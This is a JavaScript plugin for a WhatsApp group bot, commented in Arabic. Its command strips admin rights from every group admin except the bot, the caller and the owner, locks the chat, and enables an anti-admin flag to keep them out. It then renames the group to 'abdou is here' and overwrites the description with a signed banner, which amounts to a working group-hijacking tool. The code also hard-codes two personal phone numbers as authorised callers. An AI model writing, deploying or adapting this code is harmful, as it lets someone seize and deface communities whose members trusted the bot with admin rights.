// plugins/arthur-lock-demote.js
// أمر: .ارثر
// يعيد سحب إشراف الأدمنز غير المستثنين، يقفل الشات، يفعّل antiAdmin
// ثم يُحدّث اسم القروب ويضع وصفًا مطابقًا لشكل الستيكَر (بدون إضافات).

const handler = async (m, { conn, usedPrefix, command }) => {
  try {
    if (!m.isGroup || !m.sender) {
      return m.reply(`*✳️ الاستخدام الصحيح:* ${usedPrefix + command}\nهذا الأمر يشتغل داخل المجموعات فقط.`);
    }

    // جلب metadata
    const metadata = await conn.groupMetadata(m.chat).catch(() => null);
    if (!metadata) return m.reply('فشل الحصول على بيانات المجموعة.');

    // مساعدات
    const norm = jid => (typeof jid === 'string' ? (/@/.test(jid) ? jid : `${jid}@s.whatsapp.net`) : jid);
    const same = (a, b) => norm(a) === norm(b);

    // أرقام الصلاحية (غيّرها إن لزم)
    const configuredDev = '213540419314@s.whatsapp.net';
    const hardExempt = '213774297599@s.whatsapp.net';
    const globalOwner = (global.owner && Array.isArray(global.owner) && global.owner[0] && global.owner[0][0])
      ? `${global.owner[0][0]}@s.whatsapp.net` : null;

    const allowedCallers = [configuredDev, hardExempt];
    if (globalOwner) allowedCallers.push(globalOwner);

    if (!allowedCallers.some(j => same(j, m.sender))) {
      return m.reply('✋ أنت غير مصرح لك بتنفيذ هذا الأمر.');
    }

    // === حذف التحقق من كون البوت أدمن ===
    // أي تحقق سابق تم حذفه هنا لتجنب رسالة الخطأ

    // استثناءات لن تُسحب إشرافها
const exemptJids = [norm(conn.user?.jid), norm(m.sender)];
if (globalOwner) exemptJids.push(globalOwner);
    // الأدمن الحاليين
    const currentAdmins = (metadata.participants || [])
      .filter(p => p.admin || p.isAdmin || p.isSuperAdmin)
      .map(p => norm(p.id));

    // من سنسحب إشرافهم
    const toDemote = currentAdmins.filter(jid => !exemptJids.some(e => same(e, jid)));

    // سحب الإشراف (مرة واحدة)
    try {
      if (toDemote.length > 0) {
        await conn.groupParticipantsUpdate(m.chat, toDemote, 'demote');
      }
    } catch (e) {
      console.error('خطأ أثناء سحب الإشراف:', e);
      return m.reply('حدث خطأ أثناء سحب الإشراف — تأكد من صلاحيات البوت.');
    }

    // قفل الشات (قراءة فقط)
    try {
      await conn.groupSettingUpdate(m.chat, 'announcement');
    } catch (e) {
      console.error('فشل قفل الشات:', e);
    }

    // تفعيل antiAdmin في DB
    try {
      global.db = global.db || {};
      global.db.data = global.db.data || {};
      global.db.data.chats = global.db.data.chats || {};
      global.db.data.chats[m.chat] = global.db.data.chats[m.chat] || {};
      global.db.data.chats[m.chat].antiAdmin = true;
    } catch (e) {
      console.error('فشل تفعيل antiAdmin في DB:', e);
    }

    // ===== هنا ننسّق الوصف ليكون **نفس شكل الستيكَر بالضبط** =====

    const newSubject = 'ᥲᑲძ᥆ᥙ іs һᥱrᥱ ❀';

    let executorName = m.pushName || m.sender.split('@')[0];
    try {
      const fetched = await conn.getName(m.sender).catch(() => null);
      if (fetched) executorName = fetched;
    } catch (e) {}

    const botName = (conn.user && (conn.user.name || conn.user.pushname)) ? (conn.user.name || conn.user.pushname) : '𝙰𝚛𝚝_𝚋𝚘𝚝';

    const dt = new Date();
    const dateStr = dt.toLocaleDateString('en-GB', { timeZone: 'Asia/Damascus' }).replace(/\//g, '/');
    const timeStr = dt.toLocaleTimeString('en-GB', { timeZone: 'Asia/Damascus' });

    const userId = m.sender;
    const packstickers = (global.db && global.db.data && global.db.data.users && global.db.data.users[userId]) ? global.db.data.users[userId] : {};
    const texto1 = packstickers.text1 || (global.packsticker || '');
    const stickerLikeDescriptionLines = [
      '٪. ─═࿇═─ ۪۪۪۪۪۪۪۪۪۪۪۪ ۫',
      '',
      `*ᰔᩚ 𝚞𝚜𝚎𝚛: ${executorName.toString().toUpperCase()}.*`,
      `*✿ ᑲ᥆𝗍: ${botName}.*`,
      `*✦ 𝚝𝚒𝚖𝚎: ${dateStr}.*`,
      `*Σ 𝚑𝚘𝚞𝚛: ${timeStr}.*`,
      '',
      ...(texto1 ? [texto1] : []),
      '',
      '╰━•°•━━━━•°•━╯',
      '*© mᥲძᥱ ᥕі𝗍һ ᑲᥡ 𝙰𝙱𝙳𝙾𝚄*'
    ];

    let description = stickerLikeDescriptionLines.join('\n');

    const SAFE_LIMIT = 460;
    if (description.length > SAFE_LIMIT) {
      const head = description.slice(0, 420);
      const tail = '\n... © powered by ABDOU';
      description = head + tail;
    }

    try {
      if (typeof conn.groupUpdateSubject === 'function') {
        await conn.groupUpdateSubject(m.chat, newSubject);
      } else if (typeof conn.groupUpdateName === 'function') {
        await conn.groupUpdateName(m.chat, newSubject);
      }
    } catch (e) {
      console.error('فشل تغيير اسم القروب:', e);
    }

    try {
      if (typeof conn.groupUpdateDescription === 'function') {
        await conn.groupUpdateDescription(m.chat, description);
      } else if (typeof conn.groupUpdateAnnounce === 'function') {
        await conn.groupUpdateAnnounce(m.chat, description);
      }
    } catch (e) {
      console.error('فشل تغيير وصف القروب:', e);
    }

    await conn.sendMessage(m.chat, { text: `*𝑫𝒐𝒏𝒆*`, mentions: [m.sender] }).catch(() => {});

  } catch (err) {
    console.error('ارثر: خطأ غير متوقع', err);
    try { await m.reply('حدث خطأ أثناء تنفيذ الأمر. راجع لوق البوت.'); } catch(e) {}
  }
};

handler.help = ['ارثر'];
handler.tags = ['group'];
handler.command = ['ارثر'];
handler.group = true;
handler.botAdmin = true;
export default handler;